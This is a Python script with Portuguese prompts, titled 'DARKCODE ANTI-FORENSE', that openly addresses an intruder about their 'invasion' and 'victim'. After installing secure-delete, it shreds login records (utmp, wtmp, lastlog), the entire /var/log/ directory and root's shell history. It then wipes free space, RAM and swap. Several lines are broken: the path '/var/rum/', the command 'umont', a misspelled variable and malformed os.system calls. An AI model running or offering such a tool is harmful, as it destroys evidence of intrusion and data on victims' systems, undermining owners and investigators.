import os 
print('''
██████╗  █████╗ ██████╗ ██╗  ██╗ ██████╗ ██████╗ ██████╗ ███████╗                              
██╔══██╗██╔══██╗██╔══██╗██║ ██╔╝██╔════╝██╔═══██╗██╔══██╗██╔════╝                              
██║  ██║███████║██████╔╝█████╔╝ ██║     ██║   ██║██║  ██║█████╗                                
██║  ██║██╔══██║██╔══██╗██╔═██╗ ██║     ██║   ██║██║  ██║██╔══╝                                
██████╔╝██║  ██║██║  ██║██║  ██╗╚██████╗╚██████╔╝██████╔╝███████╗                              
╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚═════╝ ╚══════╝                              
                                                                                               
 █████╗ ███╗   ██╗████████╗██╗      ███████╗ ██████╗ ██████╗ ███████╗███╗   ██╗███████╗███████╗
██╔══██╗████╗  ██║╚══██╔══╝██║      ██╔════╝██╔═══██╗██╔══██╗██╔════╝████╗  ██║██╔════╝██╔════╝
███████║██╔██╗ ██║   ██║   ██║█████╗█████╗  ██║   ██║██████╔╝█████╗  ██╔██╗ ██║███████╗█████╗  
██╔══██║██║╚██╗██║   ██║   ██║╚════╝██╔══╝  ██║   ██║██╔══██╗██╔══╝  ██║╚██╗██║╚════██║██╔══╝  
██║  ██║██║ ╚████║   ██║   ██║      ██║     ╚██████╔╝██║  ██║███████╗██║ ╚████║███████║███████╗
╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝   ╚═╝      ╚═╝      ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═══╝╚══════╝╚══════╝
version=1.0  criador=[DARKCODE]
FACEBOOK=https://www.facebook.com/dakcorrea.dakc.1
YOUTUBE=https://www.youtube.com/channel/UC4d_mJv4uhppA-hCdFODWJw
''')
limpar = os.system('clear')
print('''
##########################
#1=distros base debian   #
#2=distros base arch     #
#3=distros base opensuse #
#4=auto start            #
#################################
#nota                           #
#instalar o  sdel para funcionar#
#instalar o  sfill              #
#################################
''')
install = int(input("coloque o numero da sua distro para instalar os pacotes:"))
if(install==1):
	install = os.system('apt-get install secure-delete')
elif (install==2):
	install = os.system('pacman -S secure-delete')
elif (install==3):
	install = os.system('yum install secure-delete')
else:
	print("ate mais ")
print("pacotes instalados")
time = os.system('sleep 5')
limpeza = os.system('clear')
print('''
██╗  ██╗ ██████╗ ██████╗  █████╗     ██████╗  █████╗     ███╗   ███╗ █████╗ ██╗     ██████╗  █████╗ ██████╗ ███████╗    
██║  ██║██╔═══██╗██╔══██╗██╔══██╗    ██╔══██╗██╔══██╗    ████╗ ████║██╔══██╗██║     ██╔══██╗██╔══██╗██╔══██╗██╔════╝    
███████║██║   ██║██████╔╝███████║    ██║  ██║███████║    ██╔████╔██║███████║██║     ██║  ██║███████║██║  ██║█████╗      
██╔══██║██║   ██║██╔══██╗██╔══██║    ██║  ██║██╔══██║    ██║╚██╔╝██║██╔══██║██║     ██║  ██║██╔══██║██║  ██║██╔══╝      
██║  ██║╚██████╔╝██║  ██║██║  ██║    ██████╔╝██║  ██║    ██║ ╚═╝ ██║██║  ██║███████╗██████╔╝██║  ██║██████╔╝███████╗    
╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝    ╚═════╝ ╚═╝  ╚═╝    ╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝╚═════╝ ╚═╝  ╚═╝╚═════╝ ╚══════╝ 
       #####################
       #/var/run/utmp      #
       #/var/run/utmp      #
       #/var/log/wtmp      #
       #/var/log/lastlog   #
       #/var/run/utmp      #
       #/var/run/utmp      #
       #/var/log/wtmp      #
       #/var/log/lastlog   #
       #/var/log/Xorg.0.log#
       #/var/run/utmp      #
       #/var/log/lastlog   #
       #/var/log/wtmp      #
       #/var/run/utmp      #
       #####################
''')
dsa = int(input("posso fazer a limpeza da sua invasão por você ? 1=sim 2=nao =>"))
if(dsa==1):
	print("obrigado senhor vou fazer a limpeza agora")
	print("limpesa de logs")
	time = os.system("sleep 5")
	limp = os.system("sleep 5")
	dsa = os.system('sdel -vrz /var/run/utmp') 
	dsa = os.system('sdel -vrz /var/log/wtmp')
	dsa = os.system('sdel -vrz /var/log/lastlog')
	dsa = os.system('sdel -vrz /var/run/utmp')
	dsa = os.system('sdel -vrz /var/log/wtmp')
	dsa = os.system('sdel -vrz /var/log/lastlog')
	dsa = os.system('sdel -vrz /var/log/Xorg.0.log')
	dsa = os.system('sdel -vrz /var/run/utmp') 
	dsa = os.system('sdel -vrz /var/log/lastlog')
	dsa = os.system('sdel -vrz /var/log/wtmp')
	dsa = os.system('sdel -vrz /var/log/')
	dsa = os.system('sdel -vrz /var/run/utmp')
	dsa = os.system('sdel -vrz /var/rum/')
	print("deletando arquivos do usuario root do sistem =>[+]")
	time = os.system("sleep 4")
	limp = os.system("clear")
	dsa = os.system('sdel -vrz /root/.bashrc')
	dsa = os.system('sdel -vrz /root/.bash_history')
	dsa = os.system('sdel -vrz /home/$USER/.bash')
	print("limpeza de logs =>[ok] ")
	print("iniciando limpeza da memoria ram")
	dsa = int(input("senhor passo limpar a memoria ram da sua vitima!!!! 1=sim 2=nao"))
	if(dsa==1):
		print("==>pelamor de deus nao pare quando esse processo iniciar , pois ele poderar travar a sua memoria ram<==")
		print("==>pelamor de deus nao pare quando esse processo iniciar , pois ele poderar travar a sua memoria ram<==")
		print("==>pelamor de deus nao pare quando esse processo iniciar , pois ele poderar travar a sua memoria ram<==")
		print("==>pelamor de deus nao pare quando esse processo iniciar , pois ele poderar travar a sua memoria ram<==")
		print("==>pelamor de deus nao pare quando esse processo iniciar , pois ele poderar travar a sua memoria ram<==")
		time = os.system("sleep 10")
		men = os.system("smem  -v")
		print("limpeza da memoria ram finalizada =>[OK]")
		time = os.system("sleep 10")
		limp = os.system("clear")
	else:
		if(dsa==2):
			print("cuidado com a memoria ram ela pode te entregar")
		dsa = int(input("posso limpar os inodes da sua vitima senhor 1=sim 2=nao =>"))
		if(dsa==1):
			print("iniciando a limpeza de inodes")
			inode = os.system("sfill -vz / ")
			print("limpeza de inodes terminada =>[OK]")
		else:
			if(dsa==2):
				print("cuidado com os inodes do disco")
		dsa = int(input("posso limpar a swap da sua vitima 1=sim 2=nao"))
		if(dsa==1):
			disk = os.system("fdisk -l ")
			sswap = input("coloque a partição swap como mosta no comando assima")
			desm = os.system('umont -f /dev/',sswaṕ)
			swap = os.system('sswap -vz /dev/', sswap)	
else:
	if(dsa==2):
		print("por favor seja mais profissional na sua invaão e delete o seus rastros brigado de nada ;)")
